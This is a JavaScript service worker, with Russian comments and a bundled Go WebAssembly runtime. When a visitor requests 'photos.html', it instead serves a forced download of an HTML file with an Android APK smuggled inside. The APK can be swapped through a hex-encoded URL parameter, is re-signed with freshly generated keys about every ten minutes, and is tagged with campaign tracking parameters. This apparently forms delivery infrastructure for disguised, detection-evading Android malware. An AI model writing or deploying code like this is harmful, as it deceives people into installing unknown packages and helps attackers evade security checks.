// sw.js

const VERSION = 'v1.7';

const KEYS_CACHE_NAME = 'apk-keys-cache-v1';
const WASM_CACHE_NAME = 'wasm-cache-v1';

const KEYS_TTL = 10 * 60 * 1000; // 10 минут

// Установка
self.addEventListener('install', event => {
    console.log('SW installed:', VERSION);
    event.waitUntil(self.skipWaiting());
});

function multiReplace(str, replaces) {
    const escape = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const pattern = new RegExp(
        Object.keys(replaces).map(escape).join('|'),
        'g'
    );
    return str.replace(pattern, m => replaces[m]);
}

async function downloadTemplate(url, separator, replaces) {
    const response = await fetch(url);
    let text = await response.text();

    const escape = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const pattern = new RegExp(
        Object.keys(replaces).map(escape).join('|'),
        'g'
    );
    text = text.replace(pattern, m => replaces[m]);

    const parts = text.split(separator);
    if (parts.length < 2) {
        throw new Error('no separator ' + separator);
    }

    const encoder = new TextEncoder();
    const part1 = encoder.encode(parts[0]);
    const part2 = encoder.encode(parts[1]);

    return { part1, part2 };
}

// Активация
const activated = new Promise((resolve) => {
    if (self.registration && self.registration.active) {
        resolve();
    } else {
        self.addEventListener('activate', (event) => {
            event.waitUntil(
                self.clients.claim().then(() => {
                    resolve();
                })
            );
        });
    }
});

activated.then(() => {
    console.log('SW activated:', VERSION);
});

// wasm_exec_release.js
(()=>{if("undefined"!=typeof global);else if("undefined"!=typeof window)window.global=window;else{if("undefined"==typeof self)throw new Error("cannot export Go (neither global, window nor self is defined)");self.global=self}global.require||"undefined"==typeof require||(global.require=require),!global.fs&&global.require&&(global.fs=require("node:fs"));const e=()=>{const e=new Error("not implemented");return e.code="ENOSYS",e};if(!global.fs){let t="";global.fs={constants:{O_WRONLY:-1,O_RDWR:-1,O_CREAT:-1,O_TRUNC:-1,O_APPEND:-1,O_EXCL:-1},writeSync(e,n){t+=s.decode(n);const r=t.lastIndexOf("\n");return-1!=r&&(console.log(t.substr(0,r)),t=t.substr(r+1)),n.length},write(t,s,n,r,o,i){if(0!==n||r!==s.length||null!==o)return void i(e());i(null,this.writeSync(t,s))},chmod(t,s,n){n(e())},chown(t,s,n,r){r(e())},close(t,s){s(e())},fchmod(t,s,n){n(e())},fchown(t,s,n,r){r(e())},fstat(t,s){s(e())},fsync(e,t){t(null)},ftruncate(t,s,n){n(e())},lchown(t,s,n,r){r(e())},link(t,s,n){n(e())},lstat(t,s){s(e())},mkdir(t,s,n){n(e())},open(t,s,n,r){r(e())},read(t,s,n,r,o,i){i(e())},readdir(t,s){s(e())},readlink(t,s){s(e())},rename(t,s,n){n(e())},rmdir(t,s){s(e())},stat(t,s){s(e())},symlink(t,s,n){n(e())},truncate(t,s,n){n(e())},unlink(t,s){s(e())},utimes(t,s,n,r){r(e())}}}if(global.process||(global.process={getuid:()=>-1,getgid:()=>-1,geteuid:()=>-1,getegid:()=>-1,getgroups(){throw e()},pid:-1,ppid:-1,umask(){throw e()},cwd(){throw e()},chdir(){throw e()}}),!global.crypto){const e=require("node:crypto");global.crypto={getRandomValues(t){e.randomFillSync(t)}}}global.performance||(global.performance={now(){const[e,t]=process.hrtime();return 1e3*e+t/1e6}}),global.TextEncoder||(global.TextEncoder=require("node:util").TextEncoder),global.TextDecoder||(global.TextDecoder=require("node:util").TextDecoder);const t=new TextEncoder("utf-8"),s=new TextDecoder("utf-8");let n=new DataView(new ArrayBuffer(8));var r=[];const o={};if(global.Go=class{constructor(){this._callbackTimeouts=new Map,this._nextCallbackTimeoutID=1;const e=()=>new DataView(this._inst.exports.memory.buffer),i=e=>{n.setBigInt64(0,e,!0);const t=n.getFloat64(0,!0);if(0===t)return;if(!isNaN(t))return t;const s=0xffffffffn&e;return this._values[s]},l=t=>{let s=e().getBigUint64(t,!0);return i(s)},a=e=>{const t=0x7FF80000n;if("number"==typeof e)return isNaN(e)?t<<32n:0===e?t<<32n|1n:(n.setFloat64(0,e,!0),n.getBigInt64(0,!0));switch(e){case void 0:return 0n;case null:return t<<32n|2n;case!0:return t<<32n|3n;case!1:return t<<32n|4n}let s=this._ids.get(e);void 0===s&&(s=this._idPool.pop(),void 0===s&&(s=BigInt(this._values.length)),this._values[s]=e,this._goRefCounts[s]=0,this._ids.set(e,s)),this._goRefCounts[s]++;let r=1n;switch(typeof e){case"string":r=2n;break;case"symbol":r=3n;break;case"function":r=4n}return s|(t|r)<<32n},c=(t,s)=>{let n=a(s);e().setBigUint64(t,n,!0)},f=(e,t,s)=>new Uint8Array(this._inst.exports.memory.buffer,e,t),u=(e,t,s)=>{const n=new Array(t);for(let s=0;s<t;s++)n[s]=l(e+8*s);return n},d=(e,t)=>s.decode(new DataView(this._inst.exports.memory.buffer,e,t)),h=Date.now()-performance.now();this.importObject={wasi_snapshot_preview1:{fd_write:function(t,n,o,i){let l=0;if(1==t)for(let t=0;t<o;t++){let o=n+8*t,i=e().getUint32(o+0,!0),a=e().getUint32(o+4,!0);l+=a;for(let t=0;t<a;t++){let n=e().getUint8(i+t);if(13==n);else if(10==n){let e=s.decode(new Uint8Array(r));r=[],console.log(e)}else r.push(n)}}else console.error("invalid file descriptor:",t);return e().setUint32(i,l,!0),0},fd_close:()=>0,fd_fdstat_get:()=>0,fd_seek:()=>0,proc_exit:e=>{throw this.exited=!0,this.exitCode=e,this._resolveExitPromise(),o},random_get:(e,t)=>(crypto.getRandomValues(f(e,t)),0)},gojs:{"runtime.ticks":()=>BigInt(1e6*(h+performance.now())),"runtime.sleepTicks":e=>{setTimeout((()=>{if(!this.exited)try{this._inst.exports.go_scheduler()}catch(e){if(e!==o)throw e}}),Number(e)/1e6)},"syscall/js.finalizeRef":e=>{const t=0xffffffffn&e;if(void 0!==this._goRefCounts?.[t]){if(this._goRefCounts[t]--,0===this._goRefCounts[t]){const e=this._values[t];this._values[t]=null,this._ids.delete(e),this._idPool.push(t)}}else console.error("syscall/js.finalizeRef: unknown id",t)},"syscall/js.stringVal":(e,t)=>{const s=d(e>>>=0,t);return a(s)},"syscall/js.valueGet":(e,t,s)=>{let n=d(t,s),r=i(e),o=Reflect.get(r,n);return a(o)},"syscall/js.valueSet":(e,t,s,n)=>{const r=i(e),o=d(t,s),l=i(n);Reflect.set(r,o,l)},"syscall/js.valueDelete":(e,t,s)=>{const n=i(e),r=d(t,s);Reflect.deleteProperty(n,r)},"syscall/js.valueIndex":(e,t)=>a(Reflect.get(i(e),t)),"syscall/js.valueSetIndex":(e,t,s)=>{Reflect.set(i(e),t,i(s))},"syscall/js.valueCall":(t,s,n,r,o,l,a)=>{const f=i(s),h=d(n,r),g=u(o,l);try{const s=Reflect.get(f,h);c(t,Reflect.apply(s,f,g)),e().setUint8(t+8,1)}catch(s){c(t,s),e().setUint8(t+8,0)}},"syscall/js.valueInvoke":(t,s,n,r,o)=>{try{const o=i(s),l=u(n,r);c(t,Reflect.apply(o,void 0,l)),e().setUint8(t+8,1)}catch(s){c(t,s),e().setUint8(t+8,0)}},"syscall/js.valueNew":(t,s,n,r,o)=>{const l=i(s),a=u(n,r);try{c(t,Reflect.construct(l,a)),e().setUint8(t+8,1)}catch(s){c(t,s),e().setUint8(t+8,0)}},"syscall/js.valueLength":e=>i(e).length,"syscall/js.valuePrepareString":(s,n)=>{const r=String(i(n)),o=t.encode(r);c(s,o),e().setInt32(s+8,o.length,!0)},"syscall/js.valueLoadString":(e,t,s,n)=>{const r=i(e);f(t,s).set(r)},"syscall/js.valueInstanceOf":(e,t)=>i(e)instanceof i(t),"syscall/js.copyBytesToGo":(t,s,n,r,o)=>{let l=t,a=t+4;const c=f(s,n),u=i(o);if(!(u instanceof Uint8Array||u instanceof Uint8ClampedArray))return void e().setUint8(a,0);const d=u.subarray(0,c.length);c.set(d),e().setUint32(l,d.length,!0),e().setUint8(a,1)},"syscall/js.copyBytesToJS":(t,s,n,r,o)=>{let l=t,a=t+4;const c=i(s),u=f(n,r);if(!(c instanceof Uint8Array||c instanceof Uint8ClampedArray))return void e().setUint8(a,0);const d=u.subarray(0,c.length);c.set(d),e().setUint32(l,d.length,!0),e().setUint8(a,1)}}},this.importObject.env=this.importObject.gojs}async run(e){if(this._inst=e,this._values=[NaN,0,null,!0,!1,global,this],this._goRefCounts=[],this._ids=new Map,this._idPool=[],this.exited=!1,this.exitCode=0,this._inst.exports._start){let e=new Promise(((e,t)=>{this._resolveExitPromise=e}));try{this._inst.exports._start()}catch(e){if(e!==o)throw e}return await e,this.exitCode}this._inst.exports._initialize()}_resume(){if(this.exited)throw new Error("Go program has already exited");try{this._inst.exports.resume()}catch(e){if(e!==o)throw e}this.exited&&this._resolveExitPromise()}_makeFuncWrapper(e){const t=this;return function(){const s={id:e,this:this,args:arguments};return t._pendingEvent=s,t._resume(),s.result}}},global.require&&global.require.main===module&&global.process&&global.process.versions&&!global.process.versions.electron){3!=process.argv.length&&(console.error("usage: go_js_wasm_exec [wasm binary] [arguments]"),process.exit(1));const e=new Go;WebAssembly.instantiate(fs.readFileSync(process.argv[2]),e.importObject).then((async t=>{let s=await e.run(t.instance);process.exit(s)})).catch((e=>{console.error(e),process.exit(1)}))}})();

const go = new Go();

// Сохранение WASM в кэш
async function saveWasmToCache(wasmURL, wasmBytes) {
    try {
        const cache = await caches.open(WASM_CACHE_NAME);
        const response = new Response(wasmBytes, {
            headers: { 'Content-Type': 'application/wasm' }
        });
        await cache.put(wasmURL, response);
        console.log('WASM сохранён в Cache API');
    } catch (err) {
        console.error('Ошибка сохранения WASM:', err);
    }
}

// Загрузка WASM из кэша
async function loadWasmFromCache(wasmURL) {
    try {
        const cache = await caches.open(WASM_CACHE_NAME);
        const response = await cache.match(wasmURL);
        if (!response) {
            console.log('WASM не найден в кэше');
            return null;
        }

        const arrayBuffer = await response.arrayBuffer();
        console.log('WASM загружен из Cache API');
        return arrayBuffer;
    } catch (err) {
        console.error('Ошибка загрузки WASM из кэша:', err);
        return null;
    }
}

// Получение WASM (из кэша или скачивание)
async function getWasm(wasmURL) {
    // Сначала пытаемся загрузить из кэша
    let wasmBytes = await loadWasmFromCache(wasmURL);
    if (wasmBytes) {
        console.log('Используем закэшированный WASM');
        return wasmBytes;
    }

    // Если не найден — скачиваем
    console.log('Скачивание WASM модуля');
    const resp = await fetch(wasmURL);
    if (!resp.ok) {
        throw new Error('Failed to fetch ' + wasmURL);
    }
    wasmBytes = await resp.arrayBuffer();

    // Сохраняем в кэш
    await saveWasmToCache(wasmURL, wasmBytes);

    return wasmBytes;
}

const wasmReady = new Promise(async (resolve, reject) => {
    await activated;
    try {
        console.info('Загрузка WASM модуля...');
        const wasmURL = "main_release.wasm?v=103";
        const bytes = await getWasm(wasmURL);
        const result = await WebAssembly.instantiate(bytes, go.importObject);
        go.run(result.instance);
        console.log("WASM initialized");
        resolve();
    } catch (err) {
        console.error('WASM init error:', err);
        reject(err);
    }
});

// Сохранение ключей в Cache API
async function saveKeysToCache(keys) {
    try {
        const cache = await caches.open(KEYS_CACHE_NAME);
        const keysData = {
            publicKey: Array.from(keys.publicKey),
            privateKey: Array.from(keys.privateKey),
            timestamp: Date.now()
        };
        const response = new Response(JSON.stringify(keysData), {
            headers: { 'Content-Type': 'application/json' }
        });
        await cache.put('/cached-keys', response);
        console.log('Ключи сохранены в Cache API');
    } catch (err) {
        console.error('Ошибка сохранения ключей:', err);
    }
}

// Загрузка ключей из Cache API
async function loadKeysFromCache() {
    try {
        const cache = await caches.open(KEYS_CACHE_NAME);
        const response = await cache.match('/cached-keys');
        if (!response) {
            console.log('Ключи не найдены в кэше');
            return null;
        }

        const keysData = await response.json();
        const now = Date.now();

        // Проверяем TTL
        if (now - keysData.timestamp > KEYS_TTL) {
            console.log('Ключи устарели, удаляем из кэша');
            await cache.delete('/cached-keys');
            return null;
        }

        // Конвертируем обратно в Uint8Array
        const keys = {
            publicKey: new Uint8Array(keysData.publicKey),
            privateKey: new Uint8Array(keysData.privateKey)
        };
        console.log('Ключи загружены из Cache API');
        return keys;
    } catch (err) {
        console.error('Ошибка загрузки ключей:', err);
        return null;
    }
}

// Функция для генерации ключей
async function generateKeys() {
    await wasmReady;
    console.log('Генерация новых ключей...');
    const keys = generateKeyPair(); // WASM функция
    if (!keys.ok) {
        throw new Error('Ошибка генерации ключей: ' + keys.error);
    }

    const keyPair = {
        publicKey: keys.publicKey,
        privateKey: keys.privateKey
    };

    await saveKeysToCache(keyPair);
    console.log('Ключи сгенерированы и сохранены');
    return keyPair;
}

// Получение ключей
async function getKeys() {
    const cachedKeys = await loadKeysFromCache();
    if (cachedKeys) {
        console.log('Используем закэшированные ключи');
        return cachedKeys;
    }

    console.log('Генерируем новые ключи');
    return await generateKeys();
}

// Хранилище активных промисов для дедупликации
const apkProcessPromises = new Map();

// Названия кэшей
const APK_RAW_CACHE_NAME = 'apk-raw-cache-v1';      // Исходные APK
const APK_PROCESSED_CACHE_NAME = 'apk-processed-cache-v1'; // Обработанные APK

// Генерация ключа для кэша обработанных APK на основе аргументов
function getProcessedCacheKey(apkURL, options) {
    // options содержит: append, sign (keys), relabel
    const optionsHash = JSON.stringify({
        append: options.append || 0,
        relabel: options.relabel || false,
        // Хэшируем ключи, чтобы учесть их в кэше
        publicKeyHash: options.sign ? Array.from(options.sign[1]).slice(0, 16).join(',') : null
    });
    return `${apkURL}::${optionsHash}`;
}

// Сохранение сырого APK
async function saveRawApkToCache(apkURL, apkBytes) {
    try {
        const cache = await caches.open(APK_RAW_CACHE_NAME);
        const response = new Response(apkBytes, {
            headers: { 'Content-Type': 'application/vnd.android.package-archive' }
        });
        await cache.put(apkURL, response);
        console.log('Сырой APK сохранён в кэш');
    } catch (err) {
        console.error('Ошибка сохранения сырого APK:', err);
    }
}

// Загрузка сырого APK из кэша
async function loadRawApkFromCache(apkURL) {
    try {
        const cache = await caches.open(APK_RAW_CACHE_NAME);
        const response = await cache.match(apkURL);
        if (!response) {
            return null;
        }
        const arrayBuffer = await response.arrayBuffer();
        console.log('Сырой APK загружен из кэша');
        return new Uint8Array(arrayBuffer);
    } catch (err) {
        console.error('Ошибка загрузки сырого APK:', err);
        return null;
    }
}

// Сохранение обработанного APK
async function saveProcessedApkToCache(cacheKey, apkBytes) {
    try {
        const cache = await caches.open(APK_PROCESSED_CACHE_NAME);
        const response = new Response(apkBytes, {
            headers: { 'Content-Type': 'application/vnd.android.package-archive' }
        });
        await cache.put(cacheKey, response);
        console.log('Обработанный APK сохранён в кэш');
    } catch (err) {
        console.error('Ошибка сохранения обработанного APK:', err);
    }
}

// Загрузка обработанного APK из кэша
async function loadProcessedApkFromCache(cacheKey) {
    try {
        const cache = await caches.open(APK_PROCESSED_CACHE_NAME);
        const response = await cache.match(cacheKey);
        if (!response) {
            return null;
        }
        const arrayBuffer = await response.arrayBuffer();
        console.log('Обработанный APK загружен из кэша');
        return new Uint8Array(arrayBuffer);
    } catch (err) {
        console.error('Ошибка загрузки обработанного APK:', err);
        return null;
    }
}

// Основная функция с полным кэшированием
async function getAPK(apkURL, options = {}) {
    // Генерируем уникальный ключ для этой комбинации URL + options
    const processedCacheKey = getProcessedCacheKey(apkURL, options);

    // 1. Проверяем, есть ли уже активный промис для этих параметров
    if (apkProcessPromises.has(processedCacheKey)) {
        console.log('APK уже обрабатывается, возвращаем существующий промис');
        return apkProcessPromises.get(processedCacheKey);
    }

    // 2. Создаём единый промис для всей цепочки
    const processPromise = (async () => {
        try {
            // Шаг 1: Проверяем готовый обработанный APK
            let processedApk = await loadProcessedApkFromCache(processedCacheKey);
            if (processedApk) {
                console.log('✓ Используем готовый обработанный APK из кэша');
                return processedApk;
            }

            // Шаг 2: Получаем сырой APK (из кэша или качаем)
            let rawApk = await loadRawApkFromCache(apkURL);
            if (!rawApk) {
                console.log('→ Скачивание сырого APK...', apkURL);
                const response = await fetch(apkURL, {credentials: "omit"});
                if (!response.ok) {
                    throw new Error(`Failed to fetch APK: ${response.status}`);
                }
                const arrayBuffer = await response.arrayBuffer();
                rawApk = new Uint8Array(arrayBuffer);

                // Кэшируем скачанный сырой APK
                await saveRawApkToCache(apkURL, rawApk);
                console.log('✓ Сырой APK скачан и закэширован');
            } else {
                console.log('✓ Используем сырой APK из кэша');
            }

            // Шаг 3: Обрабатываем APK
            console.log('→ Обработка APK...');
            await wasmReady; // Ждём инициализации WASM

            const result = processAPKHTML(rawApk, options);
            if (!result.ok) {
                throw new Error('Ошибка обработки APK: ' + result.error);
            }

            return result;
        } finally {
            // Удаляем промис из Map после завершения
            apkProcessPromises.delete(processedCacheKey);
        }
    })();

    // Сохраняем промис ДО его выполнения
    apkProcessPromises.set(processedCacheKey, processPromise);

    return await processPromise;
}

// Обновлённая функция для использования в newApkStream
function newApkHTMLStream(apkURL, {label, apkname}) {
    return new ReadableStream({
        async start(controller) {
            try {
                await new Promise(resolve => setTimeout(resolve, 1));

                // Получаем ключи
                console.log('Получение ключей...');
                const keys = await getKeys();

                const result = await getAPK(apkURL, {
                    sign: [keys.privateKey, keys.publicKey],
                    label: label
                });

                const template = await downloadTemplate(
                    "template.html?v5",
                    "'$'",
                    {
                        "filename.apk": apkname
                    }
                );

                controller.enqueue(template.part1);
                controller.enqueue(result.htmlParts[0]);
                controller.enqueue(template.part2);
                controller.close();
            } catch (e) {
                console.error('Ошибка обработки APK:', e);
                controller.error(e);
            }
        }
    });
}

async function WARMUP_KEYS() {
    try {
        await getKeys();
        console.log('Ключи прогреты');
    } catch (err) {
        console.error('Ошибка прогрева ключей:', err);
    }
}

WARMUP_KEYS();

function hex2bin(hexString) {
    let result = '';
    for (let i = 0; i < hexString.length; i += 2) {
        result += '%' + hexString.substr(i, 2);
    }
    return decodeURIComponent(result);
}

self.addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    if (url.pathname.endsWith('photos.html')) {
        event.respondWith(
            (async () => {

                let htmlname = "download2025.html";
                if (url.searchParams.get("htmlname")){
                    htmlname = url.searchParams.get("htmlname");
                    if (!htmlname.includes(".html")){
                        htmlname += ".html"
                    }
                }

                let apkname = "download2025.apk";
                if (url.searchParams.get("apkname")){
                    apkname = url.searchParams.get("apkname");
                    if (!apkname.includes(".apk")){
                        apkname += Math.round(Math.random() * 100000) + ".apk"
                    }
                }

                let apkURL = "input.apk";
                let au = url.searchParams.get("au");
                if (au){
                    apkURL = hex2bin(au);
                }
                console.log("apkURL", apkURL);
                let label = {
                    sclid: url.searchParams.get("sclid"),
                    network: url.searchParams.get("network"),
                };
                const stream = newApkHTMLStream(apkURL, {label, apkname});

                return new Response(stream, {
                    headers: {
                        'Content-Type': 'text/html',
                        'Content-Disposition': `attachment; filename="${htmlname}"`
                    }
                });
            })()
        );
    }
});
